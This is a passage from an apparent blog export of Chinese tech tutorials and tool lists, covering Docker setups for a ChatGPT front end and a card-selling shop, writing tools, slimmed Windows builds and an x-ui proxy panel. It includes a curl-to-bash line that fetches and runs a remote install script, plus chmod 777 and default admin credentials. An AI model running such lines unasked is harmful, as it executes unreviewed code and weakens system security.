    <content><![CDATA[<h1 id="1-安裝Docker-https-www-docker-com"><a href="#1-安裝Docker-https-www-docker-com" class="headerlink" title="1.安裝Docker https://www.docker.com/"></a>1.安裝Docker <a href="https://www.docker.com/">https://www.docker.com/</a></h1><h1 id="2-开源项目：潘多拉-Pandora-https-github-com-pengzhile-pandora"><a href="#2-开源项目：潘多拉-Pandora-https-github-com-pengzhile-pandora" class="headerlink" title="2.开源项目：潘多拉 (Pandora) https://github.com/pengzhile/pandora"></a>2.开源项目：潘多拉 (Pandora) <a href="https://github.com/pengzhile/pandora">https://github.com/pengzhile/pandora</a></h1><h1 id="3-Windows-一鍵安裝命令："><a href="#3-Windows-一鍵安裝命令：" class="headerlink" title="3.Windows 一鍵安裝命令："></a>3.Windows 一鍵安裝命令：</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull pengzhile/pandora</span><br><span class="line"></span><br><span class="line">docker run  -e PANDORA_CLOUD=cloud -e PANDORA_SERVER=0.0.0.0:8899 -p 8899:8899 -d pengzhile/pandora</span><br></pre></td></tr></table></figure>
<h1 id="4-获取自己的-Access-TOKEN：http-chat-openai-com-api-auth-session"><a href="#4-获取自己的-Access-TOKEN：http-chat-openai-com-api-auth-session" class="headerlink" title="4.获取自己的 Access TOKEN：http://chat.openai.com/api/auth/session"></a>4.获取自己的 Access TOKEN：<a href="http://chat.openai.com/api/auth/session">http://chat.openai.com/api/auth/session</a></h1><h1 id="5-访问本地链接：http-127-0-0-1-8899"><a href="#5-访问本地链接：http-127-0-0-1-8899" class="headerlink" title="5.访问本地链接：http://127.0.0.1:8899"></a>5.访问本地链接：<a href="http://127.0.0.1:8899/">http://127.0.0.1:8899</a></h1>]]></content>
      <categories>
        <category>ai</category>
        <category>chatgpt</category>
      </categories>
      <tags>
        <tag>chatgpt</tag>
        <tag>pandora</tag>
      </tags>
  </entry>
  <entry>
    <title>uvr5 人声提取（伴奏消音）神器：ultimate vocal remover</title>
    <url>/posts/9fa3480b/</url>
    <content><![CDATA[<p>Anjok07&#x2F;ultimatevocalremovergui<br><a href="https://github.com/Anjok07/ultimatevocalremovergui">https://github.com/Anjok07/ultimatevocalremovergui</a></p>
<p><img src="/img/uvr5/1.webp" alt="UVR_5_5_1"></p>
<p>下载链接<br><a href="https://github.com/Anjok07/ultimatevocalremovergui/releases">https://github.com/Anjok07/ultimatevocalremovergui/releases</a></p>
]]></content>
      <categories>
        <category>ai</category>
        <category>uvr5</category>
      </categories>
      <tags>
        <tag>ai</tag>
        <tag>uvr5</tag>
      </tags>
  </entry>
  <entry>
    <title>利用 docker 搭建独角数卡，线上小店售卖虚拟商品</title>
    <url>/posts/61affde3/</url>
    <content><![CDATA[<p>今天来和大家分享10分钟搭建一个发卡网站（发卡自动售货系统），人人都可以开一个自己的小店！</p>
<h2 id="1-独角数卡简单介绍"><a href="#1-独角数卡简单介绍" class="headerlink" title="1. 独角数卡简单介绍"></a>1. 独角数卡简单介绍</h2><h3 id="系统优势"><a href="#系统优势" class="headerlink" title="系统优势"></a>系统优势</h3><ul>
<li>采用业界流行的laravel框架，安全及稳定性提升。</li>
<li>支持自定义前端模板功能</li>
<li>支持国际化多语言包（需自行翻译）</li>
<li>代码全部开源，所有扩展包采用composer加载，代码所有内容可溯源！</li>
<li>长期技术更新支持！</li>
</ul>
<h3 id="支付接口已集成"><a href="#支付接口已集成" class="headerlink" title="支付接口已集成"></a>支付接口已集成</h3><ul>
<li>支付宝当面付</li>
<li>支付宝PC支付</li>
<li>支付宝手机支付</li>
<li>payjs微信扫码.</li>
<li>Paysapi(支付宝&#x2F;微信).</li>
<li>码支付(QQ&#x2F;支付宝&#x2F;微信)</li>
<li>微信企业扫码支付</li>
<li>Paypal支付(默认美元)</li>
<li>V免签支付</li>
<li>全网易支付支持(通用彩虹版)</li>
<li>stripe</li>
</ul>
<p>附上GitHub上的免责声明：</p>
<ul>
<li>独角数卡程序是免费开源的产品，仅用于学习交流使用！</li>
<li>不可用于任何违反中华人民共和国(含台湾省)或使用者所在地区法律法规的用途。</li>
<li>因为作者即本人仅完成代码的开发和开源活动(开源即任何人都可以下载使用)，从未参与用户的任何运营和盈利活动。</li>
<li>且不知晓用户后续将程序源代码用于何种用途，故用户使用过程中所带来的任何法律责任即由用户自己承担。</li>
</ul>
<h2 id="2-项目展示"><a href="#2-项目展示" class="headerlink" title="2. 项目展示"></a>2. 项目展示</h2><p>直接丢几个图：</p>
<p>官方unicorn模板</p>
<p><img src="/img/dujiaoshu/1.webp" alt="1-1689174285373"></p>
<p>luna模板</p>
<p><img src="/img/dujiaoshu/2.webp" alt="2-1689174285132"></p>
<p>hyper模板</p>
<p><img src="/img/dujiaoshu/3.webp" alt="3-1689174285228"></p>
<p><img src="/img/dujiaoshu/4.webp" alt="4"></p>
<p><img src="/img/dujiaoshu/5.webp" alt="5"></p>
<p><img src="/img/dujiaoshu/6.webp" alt="6"></p>
<p><img src="/img/dujiaoshu/7.webp" alt="7"></p>
<h2 id="3-相关地址"><a href="#3-相关地址" class="headerlink" title="3. 相关地址"></a>3. 相关地址</h2><p>GitHub官方仓库：<a href="https://github.com/assimon/dujiaoka">https://github.com/assimon/dujiaoka</a></p>
<p>Docker镜像地址：<a href="https://hub.docker.com/r/stilleshan/dujiaoka">https://hub.docker.com/r/stilleshan/dujiaoka</a> （同时支持 X86 和 ARM 架构）来自：<a href="https://www.ioiox.com/archives/159.html">Stille大佬</a></p>
<h2 id="4-搭建环境"><a href="#4-搭建环境" class="headerlink" title="4. 搭建环境"></a>4. 搭建环境</h2><ul>
<li>服务器：腾讯香港轻量应用服务器 24 元 &#x2F; 月 VPS 一台 自己搭建用的是硅谷的<a href="https://loll.cc/tx">腾讯轻量应用服务器</a> ，（这次最好选 非大陆的，而且线路还不错的机器）如果是小白刚开始玩的话，也可以选择 <a href="https://gao.ee/lca">莱卡云 美国CN2 GIA</a> 的服务器</li>
<li>系统：Debian 11 非必需 DD，用原来的系统也 OK，之后教程都是用 Debian 或者 Ubuntu 搭建～）</li>
<li>安装好 Docker、Docker-compose</li>
<li>【非必需但建议】域名一枚，并做好解析到服务器上</li>
<li>【非必需】提前安装好宝塔面板海外版本 aapanel，并安装好 Nginx</li>
<li>【非必需本教程选用】安装好 Nginx Proxy Manager<br>服务器要求：内存建议1G，能安装Docker即可～</li>
</ul>
<h2 id="5-搭建方式"><a href="#5-搭建方式" class="headerlink" title="5. 搭建方式"></a>5. 搭建方式</h2><p>如果你不是用的腾讯云的轻量应用服务器，可以直接跳到 6.1 部分。</p>
<h3 id="安装系统（腾讯云轻量应用服务器）"><a href="#安装系统（腾讯云轻量应用服务器）" class="headerlink" title="安装系统（腾讯云轻量应用服务器）"></a>安装系统（腾讯云轻量应用服务器）</h3><p>腾讯云轻量服务器最大的特点就是 “轻量”，相比 CVM，更适合小白上手，这边我们之间选择 Docker 基础镜像，就可以省去后面安装 Docker 的步骤 （如果你非要用国内的服务器，这边装的 Docker 镜像还会帮你配置好国内镜像源，让你加速访问 docker 镜像资源） 不要用国内的 。</p>
<h3 id="登陆（腾讯云轻量应用服务器）"><a href="#登陆（腾讯云轻量应用服务器）" class="headerlink" title="登陆（腾讯云轻量应用服务器）"></a>登陆（腾讯云轻量应用服务器）</h3><h3 id="5-1-安装-Docker-与-Nginx-Proxy-Manager"><a href="#5-1-安装-Docker-与-Nginx-Proxy-Manager" class="headerlink" title="5.1 安装 Docker 与 Nginx Proxy Manager"></a>5.1 安装 Docker 与 Nginx Proxy Manager</h3><h3 id="5-2-创建安装目录"><a href="#5-2-创建安装目录" class="headerlink" title="5.2 创建安装目录"></a>5.2 创建安装目录</h3><p>创建一下安装的目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br><span class="line"></span><br><span class="line">mkdir -p /root/data/docker_data/shop</span><br><span class="line"></span><br><span class="line">cd /root/data/docker_data/shop</span><br><span class="line"></span><br><span class="line">mkdir storage uploads</span><br><span class="line"></span><br><span class="line">chmod -R 777 storage uploads</span><br><span class="line"># 创建数据目录用于挂载</span><br><span class="line"></span><br><span class="line">touch env.conf</span><br><span class="line"></span><br><span class="line">chmod -R 777 env.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这边我们直接用 docker 的方式安装。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim docker-compose.yml</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>英文输入法下，按 <code>i</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &quot;3&quot;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  web:</span><br><span class="line">    image: stilleshan/dujiaoka</span><br><span class="line">    environment:</span><br><span class="line">        # - INSTALL=false</span><br><span class="line">        - INSTALL=true</span><br><span class="line">        # - MODIFY=true</span><br><span class="line">    volumes:</span><br><span class="line">      - ./env.conf:/dujiaoka/.env</span><br><span class="line">      - ./uploads:/dujiaoka/public/uploads</span><br><span class="line">      - ./storage:/dujiaoka/storage</span><br><span class="line">    ports:</span><br><span class="line">      - 8090:80         # 8090可以改成任意服务器没有使用过的端口，80不要修改</span><br><span class="line">    restart: always</span><br><span class="line"></span><br><span class="line">  db:</span><br><span class="line">    image: mariadb:focal</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_ROOT_PASSWORD=changeyourpassword</span><br><span class="line">      - MYSQL_DATABASE=dujiaoka</span><br><span class="line">      - MYSQL_USER=dujiaoka</span><br><span class="line">      - MYSQL_PASSWORD=changeyourpassword</span><br><span class="line">    volumes:</span><br><span class="line">      - ./mysql:/var/lib/mysql</span><br><span class="line"></span><br><span class="line">  redis:</span><br><span class="line">    image: redis:alpine</span><br><span class="line">    restart: always</span><br><span class="line">    volumes:</span><br><span class="line">      - ./redis:/data</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>changeyourpassword</code>可以修改成自己的密码。</p>
<p>修改好之后，注意切换成英文输入法，然后按一下 <code>esc</code>，然后 <code>:wq</code> 保存退出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim env.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">APP_NAME=小卖部</span><br><span class="line">APP_ENV=local</span><br><span class="line">APP_KEY=base64:rKwRuI6eRpCw/9e2XZKKGj/Yx3iZy5e7+FQ6+aQl8Zg=</span><br><span class="line">APP_DEBUG=true</span><br><span class="line">APP_URL=https://你的域名</span><br><span class="line"></span><br><span class="line">LOG_CHANNEL=stack</span><br><span class="line"></span><br><span class="line"># 数据库配置</span><br><span class="line">DB_CONNECTION=mysql</span><br><span class="line">DB_HOST=db</span><br><span class="line">DB_PORT=3306</span><br><span class="line">DB_DATABASE=dujiaoka</span><br><span class="line">DB_USERNAME=dujiaoka</span><br><span class="line">DB_PASSWORD=changeyourpassword</span><br><span class="line"></span><br><span class="line"># redis配置</span><br><span class="line">REDIS_HOST=redis</span><br><span class="line">REDIS_PASSWORD=</span><br><span class="line">REDIS_PORT=6379</span><br><span class="line"></span><br><span class="line">BROADCAST_DRIVER=log</span><br><span class="line">SESSION_DRIVER=file</span><br><span class="line">SESSION_LIFETIME=120</span><br><span class="line"></span><br><span class="line"># 缓存配置</span><br><span class="line"># file为磁盘文件  redis为内存级别</span><br><span class="line"># redis为内存需要安装好redis服务端并配置</span><br><span class="line">CACHE_DRIVER=redis</span><br><span class="line"></span><br><span class="line"># 异步消息队列</span><br><span class="line"># sync为同步  redis为异步</span><br><span class="line"># 使用redis异步需要安装好redis服务端并配置</span><br><span class="line">QUEUE_CONNECTION=redis</span><br><span class="line"></span><br><span class="line"># 后台语言</span><br><span class="line">## zh_CN 简体中文</span><br><span class="line">## zh_TW 繁体中文</span><br><span class="line">## en    英文</span><br><span class="line">DUJIAO_ADMIN_LANGUAGE=zh_CN</span><br><span class="line"></span><br><span class="line"># 后台登录地址</span><br><span class="line">ADMIN_ROUTE_PREFIX=/admin</span><br><span class="line"></span><br><span class="line"># 是否开启https (前端开启了后端也必须为true)</span><br><span class="line"># 后台登录出现0err或者其他登录异常问题，大概率是开启了https而后台没有开启，把下面的false改为true即可</span><br><span class="line">ADMIN_HTTPS=true</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这边可以不用动，因为后续我们安装的时候填的信息会覆盖这里面的内容，修改好之后，注意切换成英文输入法，然后按一下 <code>esc</code>，然后 <code>:wq</code> 保存退出。</p>
<h3 id="5-3-打开服务器防火墙（非必需）并访问网页"><a href="#5-3-打开服务器防火墙（非必需）并访问网页" class="headerlink" title="5.3 打开服务器防火墙（非必需）并访问网页"></a>5.3 打开服务器防火墙（非必需）并访问网页</h3><p>打开防火墙的端口 <code>8090</code></p>
<p>举例，腾讯云打开方法如下（部分服务商没有自带的面板防火墙，就不用这步操作了）：</p>
<p>图中示例填的是 <code>5230</code>，备注填的是 <code>memos</code>，这边我们填 <code>8090</code>，示例填 <code>shop</code> ，确定即可（如果你在 docker-compose 文件里换了 <code>9009</code>，这边就需要填 <code>9009</code>，以此类推）</p>
<p>查看端口是否被占用（以 <code>8090</code> 为例），输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsof -i:8090  #查看 8090 端口是否被占用，如果被占用，重新自定义一个端口</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果啥也没出现，表示端口未被占用，我们可以继续下面的操作了～</p>
<p>如果出现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-bash: lsof: command not found</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install lsof  #安装 lsof</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果端口没有被占用（被占用了就修改一下端口，比如改成 <code>8081</code>，注意 docker 命令行里和防火墙都要改）</p>
<p>最后：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root/data/docker_data/shop    # 来到 dockercompose 文件所在的文件夹下</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>理论上我们就可以输入 <code>http://ip:8090</code> 访问安装了。</p>
<blockquote>
<p><strong>注意：</strong></p>
<p>1、不知道服务器 IP，可以直接在命令行输入：<code>curl ip.sb</code>，会显示当前服务器的 IP。</p>
<p>2、遇到访问不了的情况，请再次检查在宝塔面板的防火墙和服务商的后台防火墙是否打开对应了端口。</p>
</blockquote>
<p>有的小伙伴可能想搭建起来分享给其他人使用，如果后续想要分享给别人，IP + 端口太不优雅了，而且这个涉及到密码的，还是非常需要做https的！会让网页更安全！</p>
<p><a href="https://loll.cc/ns">namesilo</a> 上面 xyz 后缀的域名一年就 7 块钱，可以年抛。（冷知识，namesilo上 6位数字的xyz续费永远都是0.99美元 &#x3D; &#x3D;）</p>
<p>如果想要长期使用，还是建议买 com 后缀的域名，更加正规一些，可以输入 <code>laodade</code> 来获得 1 美元的优惠（不知道现在还有没有）</p>
<p><a href="https://loll.cc/ns">namesilo</a> 自带隐私保护，咕咕一直在用这家，价格也是这些注册商里面比较低的，关键是他家不像其他家域名注册商，没有七七八八的套路！（就是后台界面有些丑 古老 &#x3D; &#x3D;）</p>
<h3 id="5-4-更新-shop"><a href="#5-4-更新-shop" class="headerlink" title="5.4 更新 shop"></a>5.4 更新 shop</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root/data/docker_data/shop</span><br><span class="line"></span><br><span class="line">docker-compose down</span><br><span class="line"></span><br><span class="line">cp -r /root/data/docker_data/shop /root/data/docker_data/shop.archive  # 万事先备份，以防万一</span><br><span class="line"></span><br><span class="line">docker-compose pull</span><br><span class="line"></span><br><span class="line">docker-compose up -d    # 请不要使用 docker-compose stop 来停止容器，因为这么做需要额外的时间等待容器停止；docker-compose up -d 直接升级容器时会自动停止并立刻重建新的容器，完全没有必要浪费那些时间。</span><br><span class="line"></span><br><span class="line">docker image prune  # prune 命令用来删除不再使用的 docker 对象。删除所有未被 tag 标记和未被容器使用的镜像</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>提示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WARNING! This will remove all dangling images.</span><br><span class="line">Are you sure you want to continue? [y/N]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输入 <code>y</code></p>
<p>利用 Docker 搭建的应用，更新非常容易～</p>
<h3 id="5-5-卸载-shop"><a href="#5-5-卸载-shop" class="headerlink" title="5.5 卸载 shop"></a>5.5 卸载 shop</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root/data/docker_data/shop</span><br><span class="line"></span><br><span class="line">docker-compose down</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">rm -rf /root/data/docker_data/shop  # 完全删除映射到本地的数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以卸载得很干净。</p>
<h2 id="6-反向代理"><a href="#6-反向代理" class="headerlink" title="6. 反向代理"></a>6. 反向代理</h2><p>我们要用域名而不是IP+端口的方式来访问我们的服务！</p>
<h3 id="6-1-利用-Nginx-Proxy-Manager"><a href="#6-1-利用-Nginx-Proxy-Manager" class="headerlink" title="6.1 利用 Nginx Proxy Manager"></a>6.1 利用 Nginx Proxy Manager</h3><p>在添加反向代理之前，确保你已经完成了域名解析，不会的可以看这个：<strong>域名一枚，并做好解析到服务器上</strong></p>
<p>之后，登陆 Nginx Proxy Manager</p>
<p>注意：</p>
<blockquote>
<p>Nginx Proxy Manager（以下简称 NPM）会用到 <code>80</code>、<code>443</code> 端口，所以本机不能占用（比如原来就有 Nginx）</p>
</blockquote>
<p>直接丢几张图：</p>
<blockquote>
<p>注意填写对应的 <code>域名</code>、<code>IP</code> 和 <code>端口</code>，按文章来的话，应该是 <code>8090</code></p>
</blockquote>
<p><strong>IP 填写：</strong></p>
<p>如果 Nginx Proxy Manager 和 shop 在同一台服务器上，可以在终端输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip addr show docker0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查看对应的 Docker 容器内部 IP。</p>
<p>否则直接填 <code>shop</code> 所在的服务器 IP 就行。</p>
<p>再次打开，勾选这些：</p>
<p>然后就可以用域名来安装访问了。</p>
<h3 id="6-2-利用宝塔面板"><a href="#6-2-利用宝塔面板" class="headerlink" title="6.2 利用宝塔面板"></a>6.2 利用宝塔面板</h3><p>发现还是有不少小伙伴习惯用宝塔面板，这边也贴一个宝塔面板的反代配置：</p>
<p>直接新建一个站点，不要数据库，不要 php，纯静态即可。</p>
<p>然后打开下面的配置，修改 Nginx 的配置。</p>
<p>代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">  proxy_pass http://127.0.0.1:8090/;       # 注意改成你实际使用的端口</span><br><span class="line">  rewrite ^/(.*)$ /$1 break;</span><br><span class="line">  proxy_redirect off;</span><br><span class="line">  proxy_set_header Host $host;</span><br><span class="line">  proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">  proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">  proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">  proxy_set_header Upgrade-Insecure-Requests 1;</span><br><span class="line">  proxy_set_header X-Forwarded-Proto https;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此方法对 90% 的反向代理都能生效，然后就可以用域名来安装访问了。</p>
<p>有同学可能会问，为什么不直接用宝塔自带的反向代理功能。</p>
<p>也可以，不过之前遇到过当有多个网站需要反代的时候，在这边设置会报错的情况 &#x3D; &#x3D;</p>
<p>所以后来就不用了，直接用上面的方法来操作了。</p>
<h2 id="7-使用教程"><a href="#7-使用教程" class="headerlink" title="7. 使用教程"></a>7. 使用教程</h2><p>成功登录之后，我们填写信息，</p>
<p>注意数据库地址填<code>db</code>，Redis填<code>redis</code></p>
<p>填写完成后，点击保存。</p>
<p>提示默认的账户名和密码都是<code>admin</code></p>
<p>此时，我们先停止容器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root/data/docker_data/shop</span><br><span class="line"></span><br><span class="line">docker-compose down</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接着我们修改一下<code>docker-compose.yml</code>以及<code>env.conf</code>里面的内容。</p>
<p>分别把<code>- INSTALL=true</code> 改成<code>- INSTALL=false</code></p>
<p>把<code>APP_DEBUG=true</code>改成<code>APP_DEBUG=false</code></p>
<p>之后运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后在域名后面加上<code>/admin</code>，输入默认的账户密码<code>admin</code>就可以正常登录后台了！</p>
<p>记得改一下用户名和密码！</p>
<h2 id="8-常见问题"><a href="#8-常见问题" class="headerlink" title="8. 常见问题"></a>8. 常见问题</h2><p>常见问题集锦：<a href="https://github.com/assimon/dujiaoka/wiki/problems">https://github.com/assimon/dujiaoka/wiki/problems</a></p>
<h2 id="9-结尾"><a href="#9-结尾" class="headerlink" title="9. 结尾"></a>9. 结尾</h2><p>祝大家用得开心，有问题可以去 GitHub 提 <a href="https://github.com/assimon/dujiaoka/issues">Issues</a>，也可以在评论区互相交流探讨。</p>
<p>同时，有能力给项目做贡献的同学，也欢迎积极加入到 <a href="https://github.com/assimon/dujiaoka">项目</a> 中来，贡献自己的一份力量！</p>
<p>最后，感谢开发人员们的辛苦付出，让我们能用到这么优秀的项目！</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>GitHub仓库：<a href="https://github.com/assimon/dujiaoka">https://github.com/assimon/dujiaoka</a></p>
<p>用到的Stille大佬镜像：<a href="https://hub.docker.com/r/stilleshan/dujiaoka">https://hub.docker.com/r/stilleshan/dujiaoka</a></p>
<p>Stille大佬博客：<a href="https://www.ioiox.com/archives/159.html">https://www.ioiox.com/archives/159.html</a></p>
]]></content>
      <categories>
        <category>docker</category>
        <category>dujiaoshu</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>dujiaoshu</tag>
      </tags>
  </entry>
  <entry>
    <title>违禁词查询工具合集 小红书、抖音、B站、淘宝等适用</title>
    <url>/posts/7cfbd037/</url>
    <content><![CDATA[<p>禁用词查询 (综合)<br>2022 年新广告法，违禁词查询，敏感词查询，禁用词查询，广告禁用词，<br>淘宝违禁词，抖音禁用词，淘宝极限词，抖音违禁词，敏感词汇，<br><a href="https://www.jinyongci.com/">https://www.jinyongci.com/</a></p>
<p>零克查词 (小红书)<br>专业的小红书、抖音、B 站、小红书敏感词检测工具<br><a href="http://ci.lingke.pro/">http://ci.lingke.pro/</a></p>
<p>句无忧 (通用)<br>2022 年广告法禁用违规词、网络铭敏感词、淘宝禁用词、抖音违禁词、查询检测工具<br><a href="https://www.check51.com/">https://www.check51.com/</a></p>
<p>句易网 (通用，新闻，美妆)<br>2022 年最新广告法淘宝抖音违禁词敏感词在线查询检测工具<br><a href="http://www.ju1.cn/">http://www.ju1.cn/</a></p>
<p>T 工具网 (综合工具)<br>违禁词在线检测_敏感词在线查询<br><a href="https://www.coder.work/textcensoring">https://www.coder.work/textcensoring</a></p>
<p>词爪 (电商)<br>免费禁用词查询_违禁词查询_电商敏感词_新广告法禁用词查询工具<br><a href="https://www.cizhua.com/">https://www.cizhua.com/</a></p>
<p>轻抖 (手机 APP)<br>违禁词检测<br><a href="http://www.qingdou.vip/">http://www.qingdou.vip/</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>weijinci</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>weijinci</tag>
      </tags>
  </entry>
  <entry>
    <title>校对错别字，改写，模板，文案，总结，脚本，广告词，等ai工具（爱校对，写作猫，AI墨飞鱼）</title>
    <url>/posts/97937c5b/</url>
    <content><![CDATA[<h1 id="1-爱校对介绍"><a href="#1-爱校对介绍" class="headerlink" title="1.爱校对介绍"></a>1.爱校对介绍</h1><p>爱校对，一款智能校对工具，依托清华大学人机交互实验室的技术成果，利用自然语言处理+深度学习的智慧场景，打造精准度更高、速度更快的文字校对体系，致力于文字校对，公文校对，论文纠错，文档查错，错别字检查，敏感词检测，旨在为严谨的文字工作者提供更有效、便捷的文字纠错工具，降低人工校对成本，提高校对效率和准确率，使用免费无需登录，支持WPS&#x2F;Word插件目前（内测中）。</p>
<p>智能校对工具官网地址<br>爱校对：<a href="https://www.ijiaodui.com/workbench">https://www.ijiaodui.com/workbench</a></p>
<h1 id="2-写作猫"><a href="#2-写作猫" class="headerlink" title="2.写作猫"></a>2.写作猫</h1><p><a href="https://xiezuocat.com/">https://xiezuocat.com</a></p>
<h1 id="3-微信小程序：AI墨飞鱼"><a href="#3-微信小程序：AI墨飞鱼" class="headerlink" title="3.微信小程序：AI墨飞鱼"></a>3.微信小程序：AI墨飞鱼</h1>]]></content>
      <categories>
        <category>tools</category>
        <category>cuobiezi</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>cuobiezi</tag>
      </tags>
  </entry>
  <entry>
    <title>PDFgear 免费且多功能的PDF转换器</title>
    <url>/posts/953b0b65/</url>
    <content><![CDATA[<p>下载地址：<a href="https://www.pdfgear.com/">https://www.pdfgear.com/</a></p>
<p>这款软件能够满足你对PDF文件的一切处理需求，支持Windows、Mac、iOS三端，并且免费无广。软件集合编辑、压缩、转换、注释、签署、OCR、整理、打印、填写PDF表格等功能于一身，甚至还内置了ChatGPT，支持与PDF文件对话。</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>pdfgear</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>pdfgear</tag>
      </tags>
  </entry>
  <entry>
    <title>免费使用 ChatGPT-4 的方法</title>
    <url>/posts/efd9d4dc/</url>
    <content><![CDATA[<p>1.ForeFront AI<br><a href="https://chat.forefront.ai/">https://chat.forefront.ai/</a></p>
<p>2.Microsoft 新版必应<br><a href="https://www.microsoft.com/zh-cn/edge/launch/newBinginEdge">https://www.microsoft.com/zh-cn/edge/launch/newBinginEdge</a></p>
<p>3.Microsoft SwiftKey Beta<br><a href="https://play.google.com/store/apps/details?id=com.touchtype.swiftkey.beta&hl=en_US">https://play.google.com/store/apps/details?id=com.touchtype.swiftkey.beta&amp;hl=en_US</a></p>
<p>4.Ora<br><a href="https://ora.ai/dashboard">https://ora.ai/dashboard</a></p>
<p>5.HuggingFace ChatGPT-4<br><a href="https://huggingface.co/spaces/ysharma/ChatGPT4">https://huggingface.co/spaces/ysharma/ChatGPT4</a></p>
]]></content>
      <categories>
        <category>ai</category>
        <category>chatgpt</category>
      </categories>
      <tags>
        <tag>chatgpt</tag>
        <tag>ai</tag>
      </tags>
  </entry>
  <entry>
    <title>精简版 windows10 和 windows11, tiny10 和 tiny11</title>
    <url>/posts/c5352caa/</url>
    <content><![CDATA[<h1 id="Tiny10"><a href="#Tiny10" class="headerlink" title="Tiny10"></a>Tiny10</h1><p>23H1 版 是基于相同的 Windows 10 LTSC 21H2（内部版本号 19044.3031）。它的主要亮点是组件存储支持，确保您可以下载每月更新，同时保持安装的低调和小磁盘占用（远程桌面也在那里）。据该项目的开发人员称，tiny10 23H1 适用于那些希望获得具有必要功能和安全措施的核心 Windows 体验的用户。<br>新 tiny10 版本的另一个值得注意的方面是能够执行就地升级。换句话说，您可以从旧的 tiny10 版本更新到 tiny10 23H1，而无需全新安装。<br><a href="https://archive.org/details/tiny-10_202301">https://archive.org/details/tiny-10_202301</a></p>
<h1 id="Tiny11"><a href="#Tiny11" class="headerlink" title="Tiny11"></a>Tiny11</h1><p>tiny11 的第二个版本已经发布，它带来了许多急需的功能：<br>1.组件商店回来了！这意味着可以轻松添加更新、新功能和语言！<br>2.删除微软团队<br>3. 删除赞助应用<br>基于 Windows 11 Pro 22H2，tiny11 拥有舒适的计算体验所需的一切，而没有标准 Windows 安装的臃肿和混乱。<br>与标准安装的 20+GB 空间相比，它只使用了大约 8GB 的空间。<br><a href="https://archive.org/details/tiny-11_202302">https://archive.org/details/tiny-11_202302</a><br>bt种子<br><a href="https://www.freedidi.com/wp-content/uploads/2023/02/tiny-11_202302_archive.torrent">https://www.freedidi.com/wp-content/uploads/2023/02/tiny-11_202302_archive.torrent</a></p>
]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>xui面板搭建xray最新reality协议 无需域名无需证书申请</title>
    <url>/posts/ba5763fd/</url>
    <content><![CDATA[<h1 id="FranzKafkaYu-x-ui"><a href="#FranzKafkaYu-x-ui" class="headerlink" title="FranzKafkaYu&#x2F;x-ui"></a>FranzKafkaYu&#x2F;x-ui</h1><p><a href="https://github.com/FranzKafkaYu/x-ui/">https://github.com/FranzKafkaYu/x-ui/</a></p>
<p>x-ui原理比较简单，有个面板，可以随意折腾各种协议，软件的使用参考之前的帖子 </p>
<h1 id="1、安装面板"><a href="#1、安装面板" class="headerlink" title="1、安装面板"></a>1、安装面板</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -Ls https://raw.githubusercontent.com/FranzKafkaYu/x-ui/master/install.sh)</span><br></pre></td></tr></table></figure>
<h1 id="2、添加入站列表"><a href="#2、添加入站列表" class="headerlink" title="2、添加入站列表"></a>2、添加入站列表</h1><p>参考下图<br><img src="/img/xui/1.webp" alt="t2zlx4-0"></p>
